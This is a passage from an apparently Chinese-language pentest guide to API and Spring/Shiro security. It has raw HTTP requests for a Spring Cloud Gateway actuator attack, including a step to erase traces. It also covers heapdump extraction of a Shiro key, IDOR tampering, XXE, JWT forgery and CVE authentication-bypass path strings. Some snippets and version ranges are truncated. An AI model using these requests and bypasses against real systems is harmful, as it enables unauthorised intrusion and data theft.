    Accept-Encoding: gzip, deflate
    Connection: close
第三步，获取命令执行结果
    GET /test/actuator/gateway/routes/AAAAAAAAAAAAAAAA HTTP/1.1
    Host: xxxx:9090
    User-Agent: xxx
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Accept-Encoding: gzip, deflate
    Connection: close
清除痕迹：
    DELETE /test/actuator/gateway/routes/AAAAAAAAAAAAAAAA HTTP/1.1
    Host: xxx
    User-Agent: xxx
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Accept-Encoding: gzip, deflate
    Connection: close
### traefik
这个倒是没爆出过什么漏洞，实战中遇到过几次dashboard存在未授权访问的情况，  
这个dashboard没法直接部署容器啥的  
但是可以从它http->http routers这里看到一些路由转发规则，比如host path，对于后续的渗透有一些帮助，可以知道一些二级目录和域名  
还有其他页面比如http services会泄露一些内网ip等等
## actuator
### 未授权访问
默认只开放 health  
如果在application.properties添加了
    management.endpoints.web.exposure.include=*
或者application.yml添加
    management:
      endpoints:
        web:
          exposure:
            #默认值访问health,info端点  用*可以包含全部端点
            include: "*"
      endpoint:
        health:
          show-details: always #获得健康检查中所有指标的详细信息
则会暴露所有端点(endpoints)  
此时这些端点就存在未授权访问  
利用方法大部分这篇文章已经讲了  
这里不再重复提及
### heapdump获取shiro key
测试环境：  
下载heapdump /actuator/heapdump  
jvisualvm.exe：Java自带的工具，默认路径为：JDK目录/bin/jvisualvm.exe  
打开heapdump， 搜索org.apache.shiro.web.mgt.CookieRememberMeManager  
然后双击这个类，找到key，右边是key的值  
复制
    -83, 105, 9, -110, -96, 22, -27, -120, 23, 113, 108, -104, -1, -35, -6, -111
转换的python脚本：
    import base64
    import struct
    print(base64.b64encode(struct.pack('  
java -jar JDumpSpider-1.0-SNAPSHOT-full.jar heapdump  
## 后端代码安全问题
api后端的应用也是由代码写出来的，各种web安全问题依旧会存在，比如sql注入 文件上传等等，这里提一个遇到比较多的越权问题和一个比较有意思的xxe漏洞
### 越权
（1）参数污染  
为单个参数提供多个值
    GET /api/user?id={userid}
    =>
    GET /api/user?id={userid1}&id={userid2}
（2）附加特殊字符和随机字符串  
简单地替换 id 可能会导致 40x等情况。可以尝试添加一些特殊字符
    / %20、%09、%0b、%0c、%1c、%1d、%1e、%1f
    GET /api/user/1
    =>
    GET /api/user/1%20
（3）添加查询参数  
url中可能并没有参数，可以自己添加一些字段（可以是网站返回的，也可以是常见的一些比如id username等等）：  
比如
    GET /api/user
    =>
    GET /api/user?id=1
    GET /api/user?userid=1
    GET /api/user?username=1
    ...
（4）修改动作  
常见有增删改查  
比如
    GET /api/edit/user/1
    =>
    GET /api/detele/user/1
    PUT /api/user  新增
    =>
    DETELE /api/user/1 尝试删除
### xxe
api为了兼容一些不同的应用场景比如小程序、app等等，可能会兼容不同的数据传输格式  
比如之前一个银行的测试，接口传输数据采用的是json格式  
将json格式数据改为xml格式时，发现存在xml外部实体注入漏洞（xxe）  
## 鉴权绕过思路
### 伪造jwt token
有些网站，访问时会给你一个jwt
token，但是payload部分很多字段是空的，这个时候可以去尝试去修改payload中，可能和身份认证相关的字段，伪造jwt token。  
伪造就需要解决签名问题  
（1）修改签名算法为none  
（2）爆破签名的密钥  
（3）伪造密钥  
...  
可以使用jwt_tool进行测试  
### Spring-security 认证绕过漏洞
CVE-2022-22978  
影响版本：  
Spring Security 5.5.x  需要认证
    /admin/1%0d%0a -> 绕过认证
### shiro权限绕过
举两个例子  
（1）CVE-2020-1957  
影响版本: shiro  403  
/;aaaa/admin/ -> 200  
（2）CVE-2020-13933  
影响版本: shiro   
[https://mp.weixin.qq.com/s?__biz=Mzg3NDcwMDk3OA==&mid=2247484068&idx=1&sn=89ea1b1be48a0cb7f93a4750765719d1&chksm=cecd8b79f9ba026f7fbf52771e41272d684fc3af5175587f768082f8dbaee12d6d33bb892ceb&scene=21#wechat_redirect](https://mp.weixin.qq.com/s?__biz=Mzg3NDcwMDk3OA==&mid=2247484068&idx=1&sn=89ea1b1be48a0cb7f93a4750765719d1&chksm=cecd8b79f9ba026f7fbf52771e41272d684fc3af5175587f768082f8dbaee12d6d33bb892ceb&scene=21#wechat_redirect)  